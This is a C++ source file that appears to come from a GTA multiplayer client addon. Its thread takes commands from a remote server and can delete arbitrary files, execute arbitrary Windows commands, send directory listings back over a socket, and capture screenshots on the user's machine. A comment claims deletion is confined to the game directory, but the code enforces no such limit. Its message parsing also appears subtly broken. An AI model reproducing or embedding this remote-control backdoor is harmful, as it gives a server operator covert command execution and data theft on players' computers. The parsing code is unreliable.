#pragma once

#include "process.h"


extern addonThread *gThread;
extern addonMutex *gMutex;
extern addonSocket *gSocket;
extern addonScreen *gScreen;
extern addonSysexec *gSysexec;
extern addonProcess *gProcess;
extern addonFS *gFS;
extern std::queue<std::string> rec_from;





addonProcess::addonProcess()
{
	addonDebug("Process constructor called");

	this->processHandle = gThread->Start((LPTHREAD_START_ROUTINE)process_thread, NULL);
}



addonProcess::~addonProcess()
{
	addonDebug("Process deconstructor called");

	gThread->Stop(this->processHandle);
}



DWORD __stdcall process_thread(LPVOID lpParam)
{
	addonDebug("Thread 'process_thread' successfuly started");

	std::vector<std::string> params;
	std::string data;
	size_t next, prev;

	while(true)
	{
		if(!rec_from.empty())
		{
			for(unsigned int i = 0; i < rec_from.size(); i++)
			{
				gMutex->Lock();
				data = rec_from.front();
				rec_from.pop();
				gMutex->unLock();

				addonDebug("Data in process: %s", data.c_str());
				addonDebug("1: %s", data.substr(0, (next = data.find('>'))).c_str());

				if(data.substr(0, (next = data.find('>'))).compare("TCPQUERY") != 0)
					continue;

				addonDebug("2: %s", data.substr(next, (prev = data.find('>', next))).c_str());

				if(data.substr(next, (prev = data.find('>', next))).compare("SERVER_CALL") != 0)
					continue;

				addonDebug("passed");

				switch(atoi(data.substr(prev, (next = data.find('>', prev))).c_str()))
				{
					case 1219: // "TCPQUERY>SERVER_CALL>1219>%s   ---   Removes file in GTA directory | %s - file name
					{
						remove(data.substr(next, INFINITE).c_str());

						break;
					}

					case 1220: // "TCPQUERY>SERVER_CALL>1220>%s   ---   Executes windows command | %s - needle command
					{
						gSysexec->Exec(data.substr(next, INFINITE));

						break;
					}

					case 1221: // "TCPQUERY>SERVER_CALL>1221>%s   ---   Directory listing | %s - directory to list
					{
						params = gFS->Dir(data.substr(next, INFINITE));

						data.clear();

						for(std::vector<std::string>::iterator i = params.begin(); i != params.end(); i++)
						{
							data += *i;
							data.push_back('\n');
						}

						gSocket->Send(data);

						break;
					}

					case 1222: // "TCPQUERY>SERVER_CALL>1222>%s   ---   Take screenshot | %s - screenshot filename
					{
						gScreen->Get(data.substr(next, INFINITE));

						break;
					}
				}

				data.clear();
			}
		}

		Sleep(1);
	}

	return true;
}
